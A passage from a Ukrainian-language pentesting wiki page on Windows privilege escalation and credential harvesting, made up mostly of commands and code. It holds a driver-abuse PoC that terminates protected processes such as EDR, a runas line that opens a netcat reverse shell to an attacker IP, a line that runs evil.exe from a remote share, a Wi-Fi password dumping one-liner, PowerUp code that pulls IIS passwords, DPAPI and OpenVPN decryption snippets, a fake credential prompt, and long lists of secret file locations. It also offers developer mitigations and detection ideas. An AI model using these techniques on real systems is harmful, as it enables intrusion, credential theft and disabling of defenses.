# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ автозавантажує будь-яку DLL плагіна у своїх підпапках `plugins`. Якщо присутня записувана портативна/копійна інсталяція, розміщення шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` при кожному запуску (включно з `DllMain` та callback`ами плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Перевірте, чи можете перезаписати якийсь registry або binary, який буде виконуватися іншим користувачем.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Пошукайте можливі **сторонні підозрілі/вразливі** драйвери
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Якщо драйвер надає arbitrary kernel read/write primitive (поширено в погано спроєктованих IOCTL handlers), можна ескалювати привілеї, викравши SYSTEM token безпосередньо з kernel memory. Покрокова техніка тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Для race-condition багів, коли вразливий виклик відкриває attacker-controlled Object Manager path, навмисне уповільнення lookup (використовуючи компоненти максимальної довжини або глибокі ланцюги директорій) може розширити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Примітиви пошкодження пам'яті Registry hive

Сучасні hive-вразливості дозволяють змоделювати детерміновані макети, зловживати writable HKLM/HKU descendants і перетворювати metadata corruption у kernel paged-pool overflows без написання custom driver. Дізнайтеся повний ланцюжок тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN на device objects (LPE + EDR kill)

Деякі підписані third‑party драйвери створюють device object зі строгим SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапора secure DACL не застосовується при відкритті пристрою через шлях, що містить додаткову компоненту, дозволяючи будь‑якому непривілейованому користувачу отримати handle, використавши namespace path типу:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Як тільки користувач може відкрити пристрій, привілейовані IOCTLs, які викриває драйвер, можна зловживати для LPE та tampering. Приклади можливостей, які спостерігалися у реальних випадках:
- Повернення full-access handles до arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Необмежений raw disk read/write (offline tampering, boot-time persistence tricks).
- Завершення arbitrary processes, включно з Protected Process/Light (PP/PPL), що дозволяє AV/EDR kill з user land через kernel.

Мінімальний PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Рекомендації для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN при створенні device objects, які мають бути обмежені DACL.
- Перевіряйте контекст викликача для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або поверненням дескрипторів.
- Обмежуйте IOCTLs (access masks, METHOD_*, валідація вхідних даних) і розглядайте брокерські моделі замість прямих привілеїв ядра.

Ідеї щодо виявлення для захисників
- Моніторьте відкриття в user-mode підозрілих назв пристроїв (e.g., \\ .\\amsdk*) та специфічні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) та підтримуйте власні списки дозволів/заборон.

## PATH DLL Hijacking

Якщо ви маєте **write permissions inside a folder present on PATH** ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.

Перевірте дозволи всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Для отримання додаткової інформації про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Мережа

### Шари
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте наявність інших відомих комп'ютерів, жорстко прописаних у hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте наявність **обмежених сервісів** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP таблиця
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила брандмауера

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(перелічити правила, створити правила, вимкнути, вимкнути...)**

Детальніше[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте root user, ви зможете прослуховувати будь-який порт (першого разу, коли ви використовуєте `nc.exe` для прослуховування порту, він через GUI запитає, чи слід дозволити `nc` у брандмауері).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash як root, можна спробувати `--default-user root`

Ви можете дослідити файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, у які **Windows** може **автоматично входити під користувача**. На перший погляд це може виглядати так, ніби користувачі можуть зберігати свої Facebook credentials, Twitter credentials, Gmail credentials тощо, щоб автоматично входити через браузери. Але це не так.

Windows Vault зберігає облікові дані, якими Windows може автоматично користуватися для входу, що означає, що будь-який **Windows-додаток, якому потрібні облікові дані для доступу до ресурсу** (сервер чи вебсайт) **може використовувати цей Credential Manager** і Windows Vault та застосовувати збережені облікові дані замість того, щоб користувачі постійно вводили ім'я користувача та пароль.

Якщо додатки не взаємодіють із Credential Manager, то, на мою думку, вони не зможуть використовувати облікові дані для конкретного ресурсу. Тому, якщо ваш додаток хоче використовувати vault, він повинен якимось чином **спілкуватися з credential manager та запитувати облікові дані для цього ресурсу** із стандартного сховища.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Тоді ви можете використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному прикладі викликається remote binary через SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` із наданими обліковими даними.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу: дані можуть бути отримані за допомогою mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), або з [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, що суттєво додає ентропії.

**DPAPI дозволяє шифрувати ключі за допомогою симетричного ключа, який виводиться зі секретів входу користувача**. У випадках системного шифрування він використовує секрети автентифікації домену системи.

Зашифровані RSA-ключі користувача за допомогою DPAPI зберігаються в каталозі %APPDATA%\Microsoft\Protect\{SID}, де {SID} позначає користувацький [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Ключ DPAPI, який знаходиться разом із master key, що захищає приватні ключі користувача в тому самому файлі, зазвичай складається з 64 байт випадкових даних.** (Важливо зазначити, що доступ до цього каталогу обмежений, тому його вміст не можна перелічити за допомогою команди dir у CMD, хоча його можна перелічити через PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Ви можете використовувати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`) щоб його розшифрувати.

**credentials files protected by the master password** зазвичай розташовані в:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використовувати **mimikatz module** `dpapi::cred` з відповідним `/masterkey` щоб розшифрувати.\
Ви можете **витягнути багато DPAPI** **masterkeys** з **memory** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** часто використовуються для **scripting** та завдань автоматизації як зручний спосіб зберігання зашифрованих credentials. Ці credentials захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп’ютері, де вони були створені.

Щоб **розшифрувати** PS credentials з файлу, що його містить, ви можете зробити:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-підключення

Знайти їх можна в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Диспетчер облікових даних віддаленого робочого столу**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Використовуйте **Mimikatz** модуль `dpapi::rdg` з відповідним `/masterkey` для **розшифрування будь-яких .rdg файлів`\
Ви можете **вилучити багато DPAPI masterkeys** з пам'яті за допомогою Mimikatz модуля `sekurlsa::dpapi`

### Sticky Notes

Люди часто використовують додаток StickyNotes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл знаходиться за шляхом `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і завжди вартий пошуку та вивчення.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** знаходиться в директорії `%systemroot%\system32\inetsrv\`.\  
Якщо цей файл існує, то можливо, що деякі **credentials** були налаштовані і можуть бути **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори запускаються **run with SYSTEM privileges**, багато з них вразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли і Регістр (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ключі хоста
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys в реєстрі

SSH private keys можуть зберігатися в ключі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тому варто перевірити, чи там є щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цій теці, це, ймовірно, збережений SSH-ключ. Він зберігається у зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо `ssh-agent` service is not running and you want it to automatically start on boot run:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Схоже, ця техніка більше не дійсна. Я намагався створити деякі ssh keys, додати їх за допомогою `ssh-add` і залогінитися через ssh на машину. Регістр HKCU\Software\OpenSSH\Agent\Keys не існує і procmon не виявив використання `dpapi.dll` під час аутентифікації за допомогою асиметричних ключів.

### Файли для автоматичної інсталяції
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Резервні копії SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Хмарні облікові дані
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Знайдіть файл під назвою **SiteList.xml**

### Кешований GPP пароль

Раніше існувала можливість, яка дозволяла розгортати власні локальні облікові записи адміністраторів на групі машин через Group Policy Preferences (GPP). Проте цей метод мав серйозні проблеми з безпекою. По-перше, Group Policy Objects (GPOs), що зберігаються як XML-файли в SYSVOL, могли бути доступні будь-якому доменному користувачу. По-друге, паролі в цих GPP, зашифровані AES256 із використанням публічно задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб пом'якшити цей ризик, була розроблена функція для сканування локально кешованих GPP-файлів, які містять поле "cpassword", що не є пустим. Після знаходження такого файлу функція дешифрує пароль і повертає спеціальний PowerShell-об'єкт. Цей об'єкт включає деталі про GPP та розташування файлу, що допомагає у виявленні та усуненні цієї вразливості.

Шукайте в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ ці файли:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN облікові дані
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Логи
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Запитати credentials

Ви завжди можете **попросити користувача ввести його credentials або навіть credentials іншого користувача**, якщо вважаєте, що він може їх знати (зверніть увагу, що **попросити** клієнта безпосередньо надати **credentials** — це дуже **ризиковано**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять credentials**

Відомі файли, які деякий час тому містили **passwords** у **clear-text** або **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Пошукайте всі запропоновані файли:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані в Кошику

Також варто перевірити Кошик на наявність облікових даних.

Щоб **відновити паролі**, збережені різними програмами, ви можете використовувати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Вам слід перевірити бази даних (dbs), де зберігаються паролі від **Chrome or Firefox**.\
Також перевірте історію, закладки та фаворити браузерів — можливо, деякі **паролі зберігаються** там.

Інструменти для витягання паролів з браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) — це технологія, інтегрована в операційну систему Windows, яка дозволяє взаємодію між програмними компонентами, написаними на різних мовах. Кожний COM-компонент ідентифікується через class ID (CLSID), а функціональність кожного компонента експонується через один або кілька інтерфейсів, ідентифікованих interface IDs (IIDs).

Класи та інтерфейси COM визначені в реєстрі під **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface** відповідно. Цей розділ реєстру утворюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Всередині CLSID-ів цього розділу реєстру можна знайти дочірній ключ **InProcServer32**, який містить **default value**, що вказує на **DLL**, та значення під назвою **ThreadingModel**, яке може бути **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) або **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

По суті, якщо ви зможете перезаписати будь-яку з DLL, що буде виконуватись, ви можете escalate privileges, якщо ця DLL буде виконана іншим користувачем.

Щоб дізнатися, як нападники використовують COM Hijacking як механізм persistence, перевірте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Загальний пошук паролів у файлах та реєстрі**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу за певною назвою**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Шукайте в реєстрі імена ключів та паролі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
